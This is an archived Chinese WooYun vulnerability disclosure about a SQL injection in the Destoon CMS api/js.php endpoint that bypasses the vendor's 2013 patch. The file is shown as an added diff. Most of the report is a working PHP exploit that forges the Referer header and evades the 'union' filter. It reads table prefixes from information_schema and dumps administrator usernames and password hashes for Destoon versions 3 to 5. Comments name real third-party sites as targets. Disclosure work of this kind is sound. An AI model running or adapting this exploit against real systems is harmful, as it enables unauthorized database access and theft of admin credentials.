@@ -1,0 +1,325 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		Destoon最新版本20131010补丁后，全版本继续注入  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		Destoon最新版本20131010补丁后，全版本继续注入  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/兔子">兔子</a> 
+</li><li>提交时间：		2013-11-25 12:26</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-25：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-11-30：	厂商主动忽略漏洞，细节向第三方安全合作伙伴开放<br/>
+									2014-02-20：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">Destoon最新版本20131010补丁后，全版本继续注入</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">问题出在api/js.php这个漏洞，这个星期工作忙，结果别人提交了，官方补丁都出来了。<br />
+<br />
+下载补丁，发现官方的修复比较马虎，没有理解漏洞的本质，分分钟绕过再次注入。<br />
+<br />
+建议官方好好思考一下这个漏洞产生的根本原因。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/241816395e6333869caab8c9d13a33c61ce47d25.jpg" target="_blank"><img src="../images/241816395e6333869caab8c9d13a33c61ce47d25.jpg" alt="t012aa700b0c5c88fae.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+strip_sql()过滤了union这个字符串，但是实际上是可以绕过的。<br />
+<br />
+由于需要伪造referer，所以用php写的脚本进行漏洞利用，需要根据实际情况修改里面的路径。<br />
+<br />
+POC里面host参数为域名，本机测试为localhost，ver参数为版本，里面写了3,4,5三个版本的利用代码。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;?php<br />
+//curl  &quot;http://www.chinaseed114.com/api/js.php?moduleid=21&amp;pagesize=100&amp;condition=0/**/union\\/**/select\\/**/1,1,1,1,concat(0x7e,0x27,username,0x3a,password,0x27,0x7e),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1%20from%20destoon_member%20where%20admin=1--&quot; --header &quot;REFERER:www.chinaseed114.com&quot;<br />
+<br />
+$host=$_GET[&#039;host&#039;];<br />
+$version=$_GET[&#039;ver&#039;];<br />
+if(!$host  || !$version)<br />
+{<br />
+exit(&quot;/api_js.php?host=localhost&amp;ver=5&quot;);<br />
+}<br />
+if($host==&quot;localhost&quot;)<br />
+{<br />
+<br />
+ if($version==4)<br />
+ {<br />
+  $path=&quot;/destoon4/api&quot;;  //这个路径需要修改<br />
+  //$url=&quot;/js.php?moduleid=21&amp;pagesize=100&amp;condition=0//***/union\\\\//***/select\\\\//***/1,1,1,1,concat(0x7e,0x27,username,0x3a,password,0x27,0x7e),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1%20from%20destoon4_member%20where%20admin=1--&quot;;<br />
+<br />
+  $url=&quot;/js.php?moduleid=21&amp;pagesize=100&amp;condition=0//***/union\\\\//***/select\\\\//***/1,1,1,1,GROUP_CONCAT(DISTINCT+table_name),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1%20from%20information_schema.columns%20where%20table_schema=database()--&quot;;//获取表前缀<br />
+  $referer=&quot;http://&quot;.$host;<br />
+  $data=send_pack($referer);//伪造referer<br />
+  preg_match(&#039;/_ask,([0-9A-Za-z]*)_banip/i&#039;, $data, $admin_match);  <br />
+  $prefix=$admin_match[1];<br />
+<br />
+  $url=&quot;/js.php?moduleid=21&amp;pagesize=100&amp;condition=0//***/union\\\\//***/select\\\\//***/1,1,1,1,concat(0x7e,0x27,username,0x3a,password,0x27,0x7e),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1%20from%20&quot;.$prefix.&quot;_member%20where%20admin=1--&quot;;<br />
+  $referer=&quot;http://&quot;.$host;<br />
+  $data=send_pack($referer);//伪造referer <br />
+  var_dump($data); <br />
+  <br />
+ }<br />
+ elseif($version==5)<br />
+ {<br />
+  $path=&quot;/destoon/api&quot;; //这个路径需要修改<br />
+  //$url=&quot;/js.php?moduleid=21&amp;pagesize=100&amp;condition=0/**/union\\\\/**/select\\\\/**/1,1,1,1,concat(0x7e,0x27,username,0x3a,password,0x27,0x7e),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1%20from%20destoon_member%20where%20admin=1--&quot;;<br />
+  $url=&quot;/js.php?moduleid=21&amp;pagesize=1001&amp;condition=0/**/un\\\\ion\\\\/**/select\\\\/**/1,1,1,1,GROUP_CONCAT(DISTINCT+tab\\\\le_name),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1%20from%20information_schema.columns%20where%20tab\\\\le_schema=database()--&quot;;//获取表前缀<br />
+  <br />
+  $referer=&quot;http://&quot;.$host;<br />
+  $data=send_pack($referer);//伪造referer<br />
+  preg_match(&#039;/_ask,([0-9A-Za-z]*)_banip/i&#039;, $data, $admin_match);  <br />
+  $prefix=$admin_match[1];<br />
+<br />
+  $url=&quot;/js.php?moduleid=21&amp;pagesize=100&amp;condition=0/**/uni\\\\on\\\\/**/select\\\\/**/1,1,1,1,concat(0x7e,0x27,username,0x3a,password,0x27,0x7e),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1%20from%20&quot;.$prefix.&quot;_member%20where%20admin=1--&quot;;  <br />
+  $referer=&quot;http://&quot;.$host;<br />
+  $data=send_pack($referer);//伪造referer <br />
+  var_dump($data); <br />
+ }<br />
+ elseif($version==3)<br />
+ {<br />
+  $path=&quot;/destoon3/api&quot;;<br />
+  //$url=&quot;/js.php?moduleid=21&amp;pagesize=100&amp;condition=0//***/union\\\\//***/select\\\\//***/1,1,1,1,concat(0x7e,0x27,username,0x3a,password,0x27,0x7e),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1%20from%20destoon_member%20where%20admin=1--&quot;;<br />
+  $url=&quot;/js.php?moduleid=21&amp;pagesize=100&amp;condition=0//***/union\\\\//***/select\\\\//***/1,1,1,GROUP_CONCAT(DISTINCT+table_name),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1%20from%20information_schema.columns%20where%20table_schema=database()--&quot;;//获取表前缀<br />
+  <br />
+  $referer=&quot;http://&quot;.$host;<br />
+  $data=send_pack($referer);//伪造referer<br />
+<br />
+  preg_match(&#039;/_ask,([0-9A-Za-z]*)_banip/i&#039;, $data, $admin_match);  <br />
+  $prefix=$admin_match[1];<br />
+<br />
+  $url=&quot;/js.php?moduleid=21&amp;pagesize=100&amp;condition=0//***/union\\\\//***/select\\\\//***/1,1,1,concat(0x7e,0x27,username,0x3a,password,0x27,0x7e),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1%20from%20&quot;.$prefix.&quot;_member%20where%20admin=1--&quot;;  <br />
+  $referer=&quot;http://&quot;.$host;<br />
+  $data=send_pack($referer);//伪造referer <br />
+  var_dump($data); <br />
+ }<br />
+}<br />
+else<br />
+{<br />
+//$host=&quot;www.zhishifen.com&quot;;<br />
+ if($version==4)<br />
+ {<br />
+  $path=&quot;/api&quot;;<br />
+//$url=&quot;/js.php?moduleid=21&amp;pagesize=100&amp;condition=0//***/union\\\\//***/select\\\\//***/1,1,1,1,concat(0x7e,0x27,username,0x3a,password,0x27,0x7e),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1%20from%20destoon4_member%20where%20admin=1--&quot;;<br />
+<br />
+  $url=&quot;/js.php?moduleid=21&amp;pagesize=100&amp;condition=0//***/union\\\\//***/select\\\\//***/1,1,1,1,GROUP_CONCAT(DISTINCT+table_name),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1%20from%20information_schema.columns%20where%20table_schema=database()--&quot;;//获取表前缀<br />
+  $referer=&quot;http://&quot;.$host;<br />
+  $data=send_pack($referer);//伪造referer<br />
+  preg_match(&#039;/_ask,([0-9A-Za-z]*)_banip/i&#039;, $data, $admin_match);  <br />
+  $prefix=$admin_match[1];<br />
+<br />
+  $url=&quot;/js.php?moduleid=21&amp;pagesize=100&amp;condition=0//***/union\\\\//***/select\\\\//***/1,1,1,1,concat(0x7e,0x27,username,0x3a,password,0x27,0x7e),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1%20from%20&quot;.$prefix.&quot;_member%20where%20admin=1--&quot;;<br />
+  $referer=&quot;http://&quot;.$host;<br />
+  $data=send_pack($referer);//伪造referer <br />
+  var_dump($data);   <br />
+  <br />
+ }<br />
+ //http://localhost/poc/destoon/api_js.php?host=www.tuliao86.com&amp;ver=5<br />
+ elseif($version==5)<br />
+ {<br />
+  $path=&quot;/api&quot;;<br />
+//$url=&quot;/js.php?moduleid=21&amp;pagesize=100&amp;condition=0/**/union\\\\/**/select\\\\/**/1,1,1,1,concat(0x7e,0x27,username,0x3a,password,0x27,0x7e),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1%20from%20destoon_member%20where%20admin=1--&quot;;<br />
+  $url=&quot;/js.php?moduleid=21&amp;pagesize=100&amp;condition=0/**/union\\\\/**/select\\\\/**/1,1,1,1,GROUP_CONCAT(DISTINCT+table_name),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1%20from%20information_schema.columns%20where%20table_schema=database()--&quot;;//获取表前缀<br />
+  <br />
+  $referer=&quot;http://&quot;.$host;<br />
+  $data=send_pack($referer);//伪造referer<br />
+  preg_match(&#039;/_ask,([0-9A-Za-z]*)_banip/i&#039;, $data, $admin_match);  <br />
+  $prefix=$admin_match[1];<br />
+<br />
+  $url=&quot;/js.php?moduleid=21&amp;pagesize=100&amp;condition=0/**/union\\\\/**/select\\\\/**/1,1,1,1,concat(0x7e,0x27,username,0x3a,password,0x27,0x7e),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1%20from%20&quot;.$prefix.&quot;_member%20where%20admin=1--&quot;;  <br />
+  $referer=&quot;http://&quot;.$host;<br />
+  $data=send_pack($referer);//伪造referer <br />
+  var_dump($data); <br />
+ } <br />
+ elseif($version==3)<br />
+ {<br />
+  $path=&quot;/api&quot;;<br />
+  //$url=&quot;/js.php?moduleid=21&amp;pagesize=100&amp;condition=0//***/union\\\\//***/select\\\\//***/1,1,1,1,concat(0x7e,0x27,username,0x3a,password,0x27,0x7e),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1%20from%20destoon_member%20where%20admin=1--&quot;;<br />
+  $url=&quot;/js.php?moduleid=21&amp;pagesize=100&amp;condition=0//***/union\\\\//***/select\\\\//***/1,1,1,GROUP_CONCAT(DISTINCT+table_name),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1%20from%20information_schema.columns%20where%20table_schema=database()--&quot;;//获取表前缀<br />
+  <br />
+  $referer=&quot;http://&quot;.$host;<br />
+  $data=send_pack($referer);//伪造referer<br />
+<br />
+  preg_match(&#039;/_ask,([0-9A-Za-z]*)_banip/i&#039;, $data, $admin_match);  <br />
+  $prefix=$admin_match[1];<br />
+<br />
+  $url=&quot;/js.php?moduleid=21&amp;pagesize=100&amp;condition=0//***/union\\\\//***/select\\\\//***/1,1,1,concat(0x7e,0x27,username,0x3a,password,0x27,0x7e),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1%20from%20&quot;.$prefix.&quot;_member%20where%20admin=1--&quot;;  <br />
+  $referer=&quot;http://&quot;.$host;<br />
+  $data=send_pack($referer);//伪造referer <br />
+  var_dump($data); <br />
+ }<br />
+<br />
+}<br />
+<br />
+ <br />
+<br />
+<br />
+function send_pack($cmd)  <br />
+{  <br />
+ global $host, $path, $url;  <br />
+ $data = &quot;GET &quot; . $path . &quot;$url HTTP/1.1\r\n&quot;;  <br />
+ $data .= &quot;Host: $host\r\n&quot;;  <br />
+ //$data .= &quot;User-Agent: Baiduspider\r\n&quot;;  <br />
+ $data .= &quot;Referer: &quot; . $cmd . &quot;\r\n&quot;;  <br />
+ $data .= &quot;Connection: Close\r\n\r\n&quot;;  <br />
+ $fp = @fsockopen($host, 80, $errno, $errstr, 10);  <br />
+ //echo ini_get(&#039;default_socket_timeout&#039;);//默认超时时间为60秒  <br />
+ if (!$fp) <br />
+ {  <br />
+  echo $errno . &#039;--&gt;&#039; . $errstr . &quot;\n&quot;;  <br />
+  exit(&#039;Could not connect to: &#039; . $host);  <br />
+ } <br />
+ else<br />
+ {  <br />
+  fwrite($fp, $data);  <br />
+  $back = &#039;&#039;;  <br />
+  while (!feof($fp)) <br />
+  {  <br />
+    $back .= fread($fp, 1024);  <br />
+  }   <br />
+  fclose($fp);  <br />
+ }  <br />
+ return $back;  <br />
+}</code></pre><p class='detail'><br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">你们有程序牛 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/兔子" title="兔子">兔子</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-043931" title="Destoon最新版本20131010补丁后，全版本继续注入">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-11-30 12:26</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="43931";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
